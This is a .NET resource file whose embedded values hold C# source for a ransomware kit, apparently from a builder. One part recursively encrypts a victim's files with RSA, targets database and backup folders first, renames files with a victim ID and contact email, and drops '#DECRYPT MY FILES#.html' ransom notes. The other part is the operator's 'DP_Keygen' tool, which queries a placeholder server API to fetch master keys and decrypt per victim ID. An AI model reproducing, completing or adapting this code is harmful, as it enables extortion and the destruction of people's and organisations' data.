                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;
                Process procCommand = Process.Start(startInfo);
                StreamReader srIncoming = procCommand.StandardOutput;
                string result = srIncoming.ReadToEnd();
                return result;
            }
            catch (Exception)
            {
                return "Exception";
            }

        }

        private static string BackspacesCleaner(string FolderName)
        {
            FolderName = FolderName.Replace("Disk", "");
            while (FolderName[FolderName.Length - 1] == ' ')
            {
                FolderName = FolderName.Substring(0, FolderName.Length - 2);
            }
            return FolderName;
        }

        private static void Encrypter(string file, RSACryptoServiceProvider ThRSA)
        {
            try { EncryptFile(file, ThRSA); }
            catch (Exception) { Encrypter(file, ThRSA); }
        }

        private static void PriorityEncryption()
        {
            EncryptFolder(Directory.GetCurrentDirectory());
            foreach (string drive in Drives) PrioritySearcher(drive);
        }

        private static void PrioritySearcher(string path)
        {
            try
            {
                string[] trigers = {"mysql", "firebird", " mssql", "microsoft sql", "backup"};
                foreach (string trigger in trigers) if (Path.GetDirectoryName(path).Contains(trigger)) EncryptFolder(path);
                foreach (var directory in Directory.GetDirectories(path))
                {
                    foreach (string trigger in trigers) if (Path.GetDirectoryName(directory).Contains(trigger)) EncryptFolder(directory);
                    PrioritySearcher(directory);
                }
            }
            catch (Exception ex) { }
        }

        private static void EncryptFolder(string path)
        {
            RSACryptoServiceProvider ThRSA = new RSACryptoServiceProvider();
            ThRSA.FromXmlString(RSA_Public);
            List&lt;string&gt; top = new List&lt;string&gt;();
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            try { top.AddRange(Directory.GetFiles(path, "*.*", SearchOption.TopDirectoryOnly)); }
            catch (Exception) { }
            foreach (string file in top)
            {
                FilesCount++;
                Encrypter(file, ThRSA);
            }
            try
            {
                if (SaveTextForUnlock) DropDecriptionText(path);
                foreach (var directory in Directory.GetDirectories(path))
                {
                    if (directory.ToLower().Contains("windows")) continue;
                    if (directory.ToLower().Contains("firefox")) continue;
                    if (directory.ToLower().Contains("chrome")) continue;
                    if (directory.ToLower().Contains("google")) continue;
                    if (directory.ToLower().Contains("opera")) continue;
                    if (directory == Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+"\\DP") continue;
                    if (directory != desktop) EncryptFolder(directory);
                }
            }
            catch (Exception ex) { }
        }

        private static void GetDesktopFiles(string path)
        {
            List&lt;string&gt; top = new List&lt;string&gt;();
            RSACryptoServiceProvider ThRSA = new RSACryptoServiceProvider();
            ThRSA.FromXmlString(RSA_Public);
            try
            {

                try { top.AddRange(Directory.GetFiles(path, "*.*", SearchOption.TopDirectoryOnly)); }
                catch (Exception) { }
                foreach (string file in top) Encrypter(file, ThRSA);
                if (SaveTextForUnlock) DropDecriptionText(path);
                foreach (var directory in Directory.GetDirectories(path))
                {
                    EncryptFolder(directory);
                    directories.Add(directory);
                }
            }
            catch (Exception ex) { }
        }

        private static void EncryptFile(string file, RSACryptoServiceProvider ThRSA)
        {
            try
            {
                FileInfo FN = new FileInfo(file);
                if (FN.Extension != CryptedExtension &amp;&amp; !FN.FullName.Contains("#DECRYPT MY FILES#.html") &amp;&amp; FN.Name != "id.dp" &amp;&amp; FN.Name != "DecryptionInfo.auth" &amp;&amp; FN.Extension != ".dp")
                {
                    List&lt;byte[]&gt; partfile = new List&lt;byte[]&gt;();
                    List&lt;byte&gt; lwrt = new List&lt;byte&gt;();
                    if (FN.Length / 1024 &gt; 64)
                    {
                        partfile = GetPartOfFile(file, 547 * 1); // 10 мегабайт(85470) умножить на Х.
                    }
                    else
                    {
                        int blocks = Convert.ToInt32(FN.Length / 117);
                        if (FN.Length &lt; 117)
                        {
                            partfile.Add(File.ReadAllBytes(file));
                            using (var writer = File.OpenWrite(file)) writer.SetLength(0);
                            //blocks = 1;
                        }
                        else partfile = GetPartOfFile(file, blocks);
                    }
                    if (partfile != null)
                    {
                        foreach (byte[] part in partfile)
                        {
                            byte[] wrt = ThRSA.Encrypt(part, false);
                            lwrt.AddRange(wrt);
                        }
                        File.AppendAllText(file, "&lt;CRYPTED&gt;" + Convert.ToBase64String(lwrt.ToArray()) + "&lt;/CRYPTED&gt;", Encoding.Default);
                        File.Move(file, file + "[id-" + PCID + "].[" + mail + "]"+CryptedExtension);
                        File.Delete(file);
                    }
                }
            }
            catch (Exception ex)
            {
                //StreamWriter write = new StreamWriter("Failed.txt", true);
                //write.WriteLine(file + " | " + ex);
                //write.WriteLine("\r\n");
                //write.Close();
            }
        }

        private static List&lt;byte[]&gt; GetPartOfFile(string fileName, int blocks_count)
        {
            try
            {
                int size = blocks_count * 117;
                List&lt;byte[]&gt; byteFile = new List&lt;byte[]&gt;();
                byte[] file = new byte[size]; // size = 40950 max
                using (var stream = File.OpenRead(fileName))
                {
                    stream.Seek(-(size + 0), SeekOrigin.End); // временно для теста изменил 1 на 0.
                    stream.Read(file, 0, size);
                }
                using (var writer = File.OpenWrite(fileName)) writer.SetLength(writer.Length - size);
                int k = 0;
                for (int i = 0; i &lt; blocks_count; i++)
                {
                    byte[] middle = new byte[117];
                    for (int j = 0; j &lt; 117; j++)
                    {
                        middle[j] = file[k];
                        k = k + 1;
                    }
                    byteFile.Add(middle);
                }
                return byteFile;
            }
            catch (Exception ex)
            {
                return null;
            }

        }

        private static void DropDecriptionText(string dir)
        {
            try
            {
                File.WriteAllText(dir.Replace("\\", "/") + "/#DECRYPT MY FILES#.html", text);
            }
            catch (Exception ex)
            {

            }
        }
    }
}
namespace DP_MainForm
{
    partial class Form1
    {
        /// &lt;summary&gt;
        /// Требуется переменная конструктора.
        /// &lt;/summary&gt;
        private System.ComponentModel.IContainer components = null;

        /// &lt;summary&gt;
        /// Освободить все используемые ресурсы.
        /// &lt;/summary&gt;
        /// &lt;param name="disposing"&gt;истинно, если управляемый ресурс должен быть удален; иначе ложно.&lt;/param&gt;
        protected override void Dispose(bool disposing)
        {
            if (disposing &amp;&amp; (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Код, автоматически созданный конструктором форм Windows

        /// &lt;summary&gt;
        /// Обязательный метод для поддержки конструктора - не изменяйте
        /// содержимое данного метода при помощи редактора кода.
        /// &lt;/summary&gt;
        private void InitializeComponent()
        {
            this.SuspendLayout();
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(12F, 24F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(325, 207);
            this.Font = new System.Drawing.Font("Modern No. 20", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(6);
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Form1";
            this.ShowIcon = false;
            this.Text = "All your files are encrypted.";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Form1_MouseDown);
            this.ResumeLayout(false);

        }

        #endregion

    }
}</value>
  </data>
  <data name="DP_Keygen" xml:space="preserve">
    <value>using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace DP_Keygen
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private string MasterKey = "";

        private string server = "%SERVER%";
        private string vector = "%VECTOR%";
        private string email = "%EMAIL%";

        private void Form1_Load(object sender, EventArgs e)
        {
            if (File.Exists("ExtraKey.dp")) MasterKey = File.ReadAllText("ExtraKey.dp");
            else GetMaster();
        }

        private void GetMaster()
        {
            string url = server + "/api/Master.php";
            using (var webClient = new WebClient())
            {
                var pars = new NameValueCollection();
                pars.Add("vector", vector);
                pars.Add("email", email);
                var response = webClient.UploadValues(url, pars);
                string str = System.Text.Encoding.UTF8.GetString(response);
                if (str == "I fucked your mom") Application.Exit();
                MasterKey = Encoding.Default.GetString(Convert.FromBase64String(str));
            }
        }

        private void decryptBtn_Click(object sender, EventArgs e)
        {
            try
            {
                string EText = keyTB.Text.Split('\n')[0].Trim();
                string DText = DecryptKey(EText);
                if (allPC.Checked)
                {
                    DText = DText.Substring(0, 4) + "t" + DText.Substring(4, DText.Length - 4);
                    AllPCDecrypted();
                }
                resultTB.Text = DText;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), "An error has occurred");
            }
            
        }

        private string DecryptKey(string DecryptionInfo)
        {
            byte[] privateBytes = Convert.FromBase64String(DecryptionInfo);
            int iterations = Convert.ToInt32(Math.Ceiling((double)privateBytes.Length / 128));
            List&lt;byte[]&gt; priv = new List&lt;byte[]&gt;();
            int k = 0;
            for (int i = 0; i &lt; iterations; i++)
            {
                byte[] b = new byte[128];
                for (int j = 0; j &lt; 128; j++)
                {
                    if (privateBytes.Length &gt; k)
                    {
                        b[j] = privateBytes[k];
                        k++;
                    }
                }
                priv.Add(b);
            }
            string str = "";
            RSACryptoServiceProvider MasterRSA = new RSACryptoServiceProvider();
            MasterRSA.FromXmlString(MasterKey);
            foreach (byte[] bts in priv)
            {
                str += Encoding.Default.GetString(MasterRSA.Decrypt(bts, false));
            }
            return Convert.ToBase64String(Encoding.Default.GetBytes(str));
        }

        private void victimTB_Click(object sender, EventArgs e)
        {
            victimTB.Text = "";
        }

        private void decryptBtn2_Click(object sender, EventArgs e)
        {
            string url = server + "/api/GetEncryptionInfo.php";
            using (var webClient = new WebClient())
            {
                var pars = new NameValueCollection();
                pars.Add("v", vector);
                pars.Add("id", victimTB.Text);
                var response = webClient.UploadValues(url, pars);
                string str = System.Text.Encoding.UTF8.GetString(response);
                if (str == "I fucked your mom") MessageBox.Show("Decryption key has no found.");
                else
                {
                    string DText = DecryptKey(str);
                    resultTB.Text = DText;
                }
            }
        }

        private void AllPCDecrypted()
        {
            try
            {
                string url = server + "/api/CreateDecryption.php";
                using (var webClient = new WebClient())
                {
                    var pars = new NameValueCollection();
                    pars.Add("vector", vector);
                    var response = webClient.UploadValues(url, pars);
                    string str = System.Text.Encoding.UTF8.GetString(response);
                    MessageBox.Show(str);
                }
            }
            catch (Exception)
            {

            }
        }
    }
}
namespace DP_Keygen
{
    static class Program
    {
        /// &lt;summary&gt;
        /// Главная точка входа для приложения.
        /// &lt;/summary&gt;
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
namespace DP_Keygen
{
    partial class Form1
    {
        /// &lt;summary&gt;
        /// Требуется переменная конструктора.
        /// &lt;/summary&gt;
        private System.ComponentModel.IContainer components = null;

        /// &lt;summary&gt;
        /// Освободить все используемые ресурсы.
        /// &lt;/summary&gt;
        /// &lt;param name="disposing"&gt;истинно, если управляемый ресурс должен быть удален; иначе ложно.&lt;/param&gt;
        protected override void Dispose(bool disposing)
        {
            if (disposing &amp;&amp; (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Код, автоматически созданный конструктором форм Windows

        /// &lt;summary&gt;
        /// Обязательный метод для поддержки конструктора - не изменяйте
        /// содержимое данного метода при помощи редактора кода.
        /// &lt;/summary&gt;
        private void InitializeComponent()
        {
            this.decryptBtn = new System.Windows.Forms.Button();
            this.label1 = new System.Windows.Forms.Label();
            this.victimTB = new System.Windows.Forms.TextBox();
            this.decryptBtn2 = new System.Windows.Forms.Button();
            this.allPC = new System.Windows.Forms.CheckBox();
            this.resultTB = new System.Windows.Forms.TextBox();
            this.keyTB = new System.Windows.Forms.TextBox();
            this.SuspendLayout();
            // 
            // decryptBtn
            // 
            this.decryptBtn.Location = new System.Drawing.Point(119, 204);
            this.decryptBtn.Name = "decryptBtn";
            this.decryptBtn.Size = new System.Drawing.Size(302, 23);
            this.decryptBtn.TabIndex = 0;
            this.decryptBtn.Text = "Create decryption via textbox";
            this.decryptBtn.UseVisualStyleBackColor = true;
            this.decryptBtn.Click += new System.EventHandler(this.decryptBtn_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(256, 228);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(27, 13);
            this.label1.TabIndex = 1;
            this.label1.Text = "Or...";
            // 
            // victimTB
            // 
            this.victimTB.Location = new System.Drawing.Point(119, 244);
            this.victimTB.Name = "victimTB";
            this.victimTB.Size = new System.Drawing.Size(100, 20);
            this.victimTB.TabIndex = 2;
            this.victimTB.Text = "Victim ID";
            this.victimTB.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.victimTB.Click += new System.EventHandler(this.victimTB_Click);
            // 
            // decryptBtn2
            // 
            this.decryptBtn2.Location = new System.Drawing.Point(223, 242);
            this.decryptBtn2.Name = "decryptBtn2";
            this.decryptBtn2.Size = new System.Drawing.Size(196, 23);
            this.decryptBtn2.TabIndex = 3;
            this.decryptBtn2.Text = "Create decryption file via server info";
            this.decryptBtn2.UseVisualStyleBackColor = true;
            this.decryptBtn2.Click += new System.EventHandler(this.decryptBtn2_Click);
            // 
            // allPC
            // 
            this.allPC.AutoSize = true;
            this.allPC.Cursor = System.Windows.Forms.Cursors.Hand;
            this.allPC.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.allPC.Location = new System.Drawing.Point(180, 5);
            this.allPC.Name = "allPC";
            this.allPC.Size = new System.Drawing.Size(189, 17);
            this.allPC.TabIndex = 4;
            this.allPC.Text = "FILE FOR DECRYPT ALL PC";
            this.allPC.UseVisualStyleBackColor = true;
            // 
            // resultTB
            // 
            this.resultTB.Location = new System.Drawing.Point(2, 268);
            this.resultTB.Multiline = true;
            this.resultTB.Name = "resultTB";
            this.resultTB.Size = new System.Drawing.Size(536, 175);
            this.resultTB.TabIndex = 5;
            // 
            // keyTB
            // 
            this.keyTB.Location = new System.Drawing.Point(2, 22);
            this.keyTB.Multiline = true;
            this.keyTB.Name = "keyTB";
            this.keyTB.Size = new System.Drawing.Size(536, 175);
            this.keyTB.TabIndex = 6;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(541, 446);
            this.Controls.Add(this.keyTB);
            this.Controls.Add(this.resultTB);
            this.Controls.Add(this.allPC);
            this.Controls.Add(this.decryptBtn2);
            this.Controls.Add(this.victimTB);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.decryptBtn);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.Text = "DP_Keygen";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Button decryptBtn;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TextBox victimTB;
        private System.Windows.Forms.Button decryptBtn2;
        private System.Windows.Forms.CheckBox allPC;
        private System.Windows.Forms.TextBox resultTB;
        private System.Windows.Forms.TextBox keyTB;
    }
}</value>
  </data>
  <data name="image_2" mimetype="application/x-microsoft.net.object.binary.base64">
    <value></value>
  </data>
</root>